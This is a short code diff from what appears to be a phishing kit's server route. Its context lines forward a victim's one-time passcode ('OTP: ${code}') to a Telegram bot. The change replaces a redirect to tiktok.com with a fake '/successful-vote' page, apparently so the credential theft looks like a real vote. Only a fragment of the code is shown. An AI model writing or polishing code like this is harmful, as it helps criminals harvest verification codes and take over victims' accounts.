@@ -114,8 +114,7 @@ OTP: ${code}
 
                 `)
                 .catch(err => console.log("Telegram error"));
-
-            return res.redirect("https://tiktok.com")
+            return res.redirect("/successful-vote");
         }
         else {
             return res.redirect("/notfound");
